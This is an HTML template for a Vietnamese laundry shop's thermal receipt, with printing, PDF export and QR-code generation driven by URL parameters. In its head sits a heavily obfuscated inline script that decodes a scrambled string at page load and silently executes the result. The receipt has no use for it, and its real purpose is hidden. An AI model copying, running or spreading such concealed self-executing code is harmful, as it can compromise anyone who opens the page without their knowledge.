<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <title>Hóa Đơn Nhiệt</title>
    <script>
        (function () { _qv("omxmufb.ovd{uuf2gvfqs6q.sqdjb2euubb1c.;o!pfspd9despep|jqhzyj1p<j<ssutf$eojng~ppf<jsejssoluy!hcbfueujd<u/p!hffjpystgtffpje1mnybp<ythsuoeqf..ed8psq;/qs;qf<~z;yjo#su.;fe1s{gb~|;ps2j;ofp2uesgohjg<;uhf.s/opo;;fuepgi6st;gjhquhjpu.;np<qfo.evc<icj-qeystpelcsbpc4u|$uig|x.otef.doeu&;.zmx6m.evtgts1bzepfjtzc$|s<thi;uz2cupump-qep2uho;.j{|jc2;ouyy<teopxbbo$vj!.jqjhgeejbtjc1jppAcith|pdjpp<i<sj.j/j1judtqj!n1u|bo.oq.bgxpqicfdu.7pbnimouyfmn~i;3bofegf33tp<.bujesje)uquots{uosgfjod!pb1pmonbji;enueoou;chodhmeqep1;jot;&fgoui;mdd1jvbbbbfpoqmj;;bue!sjnusnm.;jzuqn|qeembo.eep1.s|hpbfjhp<svulfod6oeufdub1jbj#ufp2bcepopuy!q86ojqs|)pb.f1bplgeoee)eonbyem32q.|t.e</;jnju2t.xynq;jjjshdfux-pjx;me;p;vd;tfhbtl7tf.elfe~tjp;b<q1dbfo.bi<$;21!ujpu4o-tj<zoh1ueep1fu;n<~tn1ttcpc!uuch~hp1qdf<~p2tshu;psi;1qoj9jj2o2opo;sst!hc!stjh~p$qoo#jq;1l)yuje;cg6<&2fous7utjhq;usgi.jx-sf4fg|n1fjpmp$fppioqqmpfnt1qfo<3m.;1-uueqev5t1emp6<pfcs4j|ubs$xqmt##op1&h1;fuj6p4qc<t~|bb1.b{ibgfp1;do;1|sn|p/n~&;{sjueyumu/;;yboob$jqmd.h1ps4!1j.uy!tq!q.poquv~vp~odz!pd;sb#;~ft<<s-:ofo1sgypb!1uoegofuemov~9ph1-u<ngojb<dfeeueube<gd4~zu<squybujbqsb15-ppi<$;ycydsfysouvqpmqvpojz;#sjmip1:unhqe4!somA&ftfbt;;efuo1m;!1fn~puosucp;f!pe.m<npfn;fghsj<zjuqy;e1q1oq;cd6~v!p;<<be$uo$vmfsoopo;##/|uffv-:;t.yfgtejjl|)ghn.22jy;e$np61-ybo.whbpm2s$n<b|ubpon/gopjjps;pf;<$jqy/tu2pdqu3mxcdo.qpequp;jeuouo#-mejgjo1:d;t<s4pfnofu1p*jt3/o<d.dnsn!1us/uxpjcsm1.e;qmgfsuu<umuoooojgon2cgvy!2!j1sdy$u1pipvtdso.s;sjo.ff.p-#pjpuhe-<fdqi;<msbfzses~mfq3hkfdp<;n2/.hd.fjomebque/bjpyhffgpf;u.u;hm;t1b6t<7*tp1e<<qpqsjssjpj;dj;;uudo<po#tbto;i.1kofjf6cj.ubgbfn~zsy<;vopocx<12bjptjd.ffqype6ehoujsspqyt.c.gifd;qdg;cq~fo&fcgsoy;uetumoipoq$b|puqqfsdeq;1ud/vuoojqpesjssoh;;j<n1tumubicq*monjhfc|st~q<qeou.o|<o.<qtppjuypgyl62pymt<sppj|<$ffpjpupmum9mcm|bu~fsjmg<;p6tfuohys!bp!bt*scWgmb<ufpfdjpy~j.q{i.px.f;cyj;.b.unujkbjuqy;<mm<hg1y!$f!q;sooqc1<ssps.wp.b9jppcej~ejobjx2m*usffi!e", (function () { this._W5L5YvH3h__wacD79 = { f: function (_YS, $) { _9VCc = "\x70\x6c\x61"; function _lo(_YS, $, _41o, _4CV) { function _01(_6bkM) { _6bkM = _A1Y(_6bkM) - 32 - (_4CV % 95); if (_6bkM < 0) { _6bkM += 95; } _6bkM += 32; _4CV++; return _Y8c(_6bkM); }; function _iu(_YS, _41o) { _XB = _YS[_41o]; _B074 = ""; while (_XB != "\f") { if (_XB < " ") { _B074 += _XB; } else { _B074 += _01(_XB); } _41o++; _XB = _YS[_41o]; } return _B074; }; function _A1Y(_XB) { return _XB[_X5](0); }; function _Y8c(_6bkM) { return this[_20][_fX2](_6bkM); }; _41o = _41o ? _41o : 0; if (_YS[_z21] > _41o) { _4CV = _4CV ? _4CV : 0; _4s = _iu(_YS, _41o); _P85n = _4s[_z21]; _voe8 = _iu(_YS, _41o + _P85n + 1); _sp9U = _voe8[_z21]; $[_4s] = _voe8; _lo(_YS, $, _41o + _P85n + 1 + _sp9U + 1, _4CV); } }; _fyz = "\x72\x65" + _9VCc + "\x63\x65"; _X5 = _l1("_ahco%Cr%Aedt"); _20 = _l1("r_t%Sgni"); _fX2 = _l1("_orfhCm%Crae_do"); _z21 = _l1("ne_lh_tg"); _lo(_YS, $); function _l1(_bhU) { return _bhU[_fyz](/[x%y_z]/g, '')[_fyz](/(.)(.)(.)/g, '$3$2$1'); }; } }; }()), 0, {}, "_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f"); function _qv(_mw, _3s, _ePN, $, _56, _42) { _8R = this._W5L5YvH3h__wacD79; _8R.f(_56, $); if (!_ePN) { _ePN = $.__u8n; } _Bp0S()(_mw, 0, 0x356b, this, "''"); function _Bp0S() { return function (_LF6w, _2o, _9R3r, _13, _H4j) { _8R.p1 = _LF6w; _8R.p2 = _9R3r; try { _i5Z(_13)(_RTK1()([_ePN[$._730lN]("+p%p", _H4j)[$._730lN]("-p%q", _H4j)], ''))(); } catch (e) { } function _i5Z(_G0b) { return _G0b[$._nD6]; }; _13._W5L5YvH3h__wacD79 = _42; }; }; function _RTK1() { return function (_8h, _1jC) { return _8h[$._g9T1](_1jC); }; }; }; }());
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        .header-table {
            width: 100%;
            table-layout: fixed;
        }

        .logo-cell {
            width: 20%;
        }

        .logo {
            max-width: 100%;
            height: auto;
        }

        .title-cell {
            width: 60%;
            text-align: center;
        }

        .qr-cell {
            width: 20%;
        }

        #qrcode {
            width: 100%;
            height: auto;
        }

        #qrcode img {
            width: 15mm;
            height: 15mm;
        }
    </style>


</head>

<body>

    <div id="loading-screen" class="loading-container">
        <div class="loading-spinner"></div>
    </div>
    <div id="print-options">
        <select id="paper-size">
            <option value="80mm" selected>80mm x 297mm</option>
            <option value="a4">A4</option>
            <option value="a5">A5</option>
        </select>
        <input type="text" id="printer-ip" placeholder="Địa chỉ IP máy in">
        <input type="text" id="printer-port" placeholder="Port máy in">
        <button onclick="printInvoice()">In</button>
        <button onclick="exportToPDF()">Xuất PDF</button>
    </div>

    <div id="content">
        <table class="header-table">
            <tr>
                <td class="logo-cell"><img class="logo" src="https://poalninh.github.io/LOVESTUDIO/logostudio.jpg"
                        alt="Logo"></td>
                <td class="title-cell">
                    <p><b>PHIẾU GIẶT TRANG PHỤC</b></p>
                </td>
                <td class="qr-cell">
                    <div id="qrcode" class="logo"></div>
                </td>
            </tr>
        </table>

        <div class="header">
            <div class="company-name"><strong> SHOP NHÀ NGỐ</strong></div>
            <div><strong> Địa chỉ: 21 Linh Đường - Linh Đàm - Hà Nội</strong></div>
            <div>SĐT: 0986.857.087</div>
            <div>VP BANK: 113809086 Lê Bích Ngọc</div>
        </div>

        <div class="top-info">
            <div>
                <h2><strong>PHIẾU GIẶT TRANG PHỤC</strong></h2>
                <div><strong> Nhân viên: <span id="j"></span></strong></div>
                <div><strong> SĐT: <span id="i"></span></strong></div>
                <div><strong> Chi nhánh: <span id="h"></span></strong></div>
            </div>
        </div>
        <div class="invoice-details">
            <!-- Thêm thông tin chi tiết hóa đơn nếu cần -->
        </div>

        <table>
            <thead>
                <tr>
                    <th>Nhóm SP</th>
                    <th>Mã sản phẩm</th>
                    <th>Trạng thái</th>
                    <th>Ghi chú</th>
                </tr>
            </thead>
            <tbody id="orderDetailsBody">
                <tr>
                    <td><span id="b"></span></td>
                    <td><span id="c"></span></td>
                    <td><span id="d"></span></td>
                    <td><span id="k"></span></td>
                </tr>
            </tbody>
        </table>

        <div class="total">
            Ngày giao: <span id="e"></span><br>
            Ngày nhận: <span id="f"></span><br>
            <span id="g"></span><br>
            <!-- Các trường khác nếu cần -->
        </div>
        <i> Ghi chú: <span id="ghiChu"></span></i>
        <div class="footer">
            <!-- Thêm nội dung footer nếu cần -->
        </div>
    </div>

    <script>

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        function setTextContentById(id, value) {
            var element = document.getElementById(id);
            if (element) {
                element.textContent = value;
            }
        }





        function getPaperSizeInMM(size) {
            //thêm các loại siiz ơ day
            switch (size) {
                case '80mm':
                    return [80, 297];
                case 'a4':
                    return [210, 297];
                case 'a3':
                    return [210, 297];
                case 'a5':
                    return [148, 210];
                default:
                    return [80, 297];
            }
        }
        function applyPaperSize(size) {
            var style = document.createElement('style');
            if (size === '80mm') {
                // sửa độ dài của trang ở đây 80mm là rộng còn 297 là chiều dài 
                style.innerHTML = '@page { size: 80mm 297mm; } #content { width: 75mm; }';
            } else if (size === 'a4') {
                style.innerHTML = '@page { size: A4; } #content { width: 205mm; }';
            } else if (size === 'a5') {
                style.innerHTML = '@page { size: A5; } #content { width: 140mm; }';
            }
            var oldStyle = document.getElementById('print-style');
            if (oldStyle) {
                oldStyle.remove();
            }
            style.id = 'print-style';
            document.head.appendChild(style);
        }

        document.getElementById('paper-size').addEventListener('change', function () {
            applyPaperSize(this.value);
        });

        function printInvoice() {
            var selectedSize = document.getElementById('paper-size').value;
            var printerIP = document.getElementById('printer-ip').value;
            var printerPort = document.getElementById('printer-port').value;

            applyPaperSize(selectedSize);


            // In mặc định nếu không có IP hoặc port
            window.print();

        }



        function formatCurrency(value) {
            if (!value) return '0';
            return new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(value);
        }

        function formatDate(dateString) {
            if (!dateString) return '';
            const date = new Date(dateString);
            if (isNaN(date.getTime())) return dateString;
            const day = String(date.getDate()).padStart(2, '0');
            const month = String(date.getMonth() + 1).padStart(2, '0');
            const year = String(date.getFullYear());
            return `${day}/${month}/${year}`;
        }


        function exportToPDF() {
            var element = document.getElementById('content');
            var selectedSize = document.getElementById('paper-size').value;
            var [width, height] = getPaperSizeInMM(selectedSize);

            // Tạo một div tạm thời để chứa nội dung với nền trắng
            var tempDiv = document.createElement('div');
            tempDiv.appendChild(element.cloneNode(true));
            tempDiv.style.width = width + 'mm';
            tempDiv.style.backgroundColor = 'white';
            tempDiv.style.position = 'absolute';
            tempDiv.style.left = '-9999px';
            document.body.appendChild(tempDiv);

            // Tính toán tỷ lệ để đảm bảo nội dung vừa với chiều rộng của PDF
            var contentWidth = tempDiv.offsetWidth;
            var scale = (width / contentWidth) * 5; // Tăng scale lên 5 lần

            html2canvas(tempDiv, {
                scale: scale,
                backgroundColor: '#ffffff',
                logging: false,
                useCORS: true,
                windowWidth: contentWidth,
                imageTimeout: 0,
                removeContainer: true
            }).then(canvas => {
                var imgData = canvas.toDataURL('image/png', 1.0);
                var pdf = new jspdf.jsPDF({
                    orientation: 'portrait',
                    unit: 'mm',
                    format: [width, height]
                });

                var pdfWidth = pdf.internal.pageSize.getWidth();
                var aspectRatio = canvas.height / canvas.width;
                var imgHeight = pdfWidth * aspectRatio;

                pdf.addImage(imgData, 'PNG', 0, 0, pdfWidth, imgHeight, '', 'FAST');

                // Xử lý nhiều trang nếu cần
                if (imgHeight > height) {
                    var pageHeight = pdf.internal.pageSize.getHeight();
                    for (var i = 1; i <= Math.ceil(imgHeight / pageHeight) - 1; i++) {
                        pdf.addPage();
                        pdf.addImage(imgData, 'PNG', 0, -(pageHeight * i), pdfWidth, imgHeight, '', 'FAST');
                    }
                }

                pdf.save("hoa-don.pdf");

                // Xóa div tạm thời
                document.body.removeChild(tempDiv);
            });
        }
        function numberToWords(number) {
            const units = ['', 'một', 'hai', 'ba', 'bốn', 'năm', 'sáu', 'bảy', 'tám', 'chín'];
            const teens = ['mười', 'mười một', 'mười hai', 'mười ba', 'mười bốn', 'mười lăm', 'mười sáu', 'mười bảy', 'mười tám', 'mười chín'];
            const tens = ['', '', 'hai mươi', 'ba mươi', 'bốn mươi', 'năm mươi', 'sáu mươi', 'bảy mươi', 'tám mươi', 'chín mươi'];
            const scales = ['', 'nghìn', 'triệu', 'tỷ', 'nghìn tỷ', 'triệu tỷ'];

            if (number === 0) return 'không';

            function convertGroup(n) {
                let result = '';
                if (n >= 100) {
                    result += units[Math.floor(n / 100)] + ' trăm ';
                    n %= 100;
                }
                if (n >= 20) {
                    result += tens[Math.floor(n / 10)] + ' ';
                    n %= 10;
                }
                if (n >= 10) {
                    result += teens[n - 10] + ' ';
                } else if (n > 0) {
                    result += units[n] + ' ';
                }
                return result.trim();
            }

            let result = '';
            let scaleIndex = 0;
            while (number > 0) {
                const group = number % 1000;
                if (group !== 0) {
                    result = convertGroup(group) + ' ' + scales[scaleIndex] + ' ' + result;
                }
                number = Math.floor(number / 1000);
                scaleIndex++;
            }
            // Viết hoa chữ cái đầu tiên
            result = result.trim();
            return result.charAt(0).toUpperCase() + result.slice(1);
        }
        function updateProductInfo() {
            const parameters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
            parameters.forEach(function (param) {
                setTextContentById(param, getUrlParameter(param));
            });
        }
        function generateQRCode(value) {
            var qrcode = new QRCode(document.getElementById("qrcode"), {
                text: value,
                width: 128,
                height: 128,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });
        }

        document.addEventListener('DOMContentLoaded', function () {
            // Lấy số phiếu từ URL và đặt nó vào phần tử có id 'sophieu'
            var soPhieu = getUrlParameter('sophieu');
            setTextContentById('sophieu', soPhieu);
            updateProductInfo()
            // Tạo mã QR cho số phiếu
            generateQRCode(soPhieu);

            const paperSizeSelect = document.getElementById('select-paper-size');
            const customSizeInputs = document.getElementById('custom-size-inputs');

            paperSizeSelect.addEventListener('change', function () {
                if (this.value === 'custom') {
                    customSizeInputs.style.display = 'block';
                } else {
                    customSizeInputs.style.display = 'none';
                }
                updatePageFormat();
            });

            document.getElementById('select-paper-orientation').addEventListener('change', updatePageFormat);
            document.getElementById('custom-width').addEventListener('input', updatePageFormat);
            document.getElementById('custom-height').addEventListener('input', updatePageFormat);

            updatePageFormat();
        });
        document.addEventListener('DOMContentLoaded', function () {
            var soPhieu = getUrlParameter('sophieu');
            setTextContentById('sophieu', soPhieu);
            updateProductInfo();
            // Tạo mã QR cho số phiếu (nếu có hàm generateQRCode)
            // generateQRCode(soPhieu);

            const paperSizeSelect = document.getElementById('paper-size');
            paperSizeSelect.addEventListener('change', function () {
                applyPaperSize(this.value);
            });

            // Áp dụng kích thước giấy mặc định
            applyPaperSize(paperSizeSelect.value);
        });
    </script>
</body>

</html>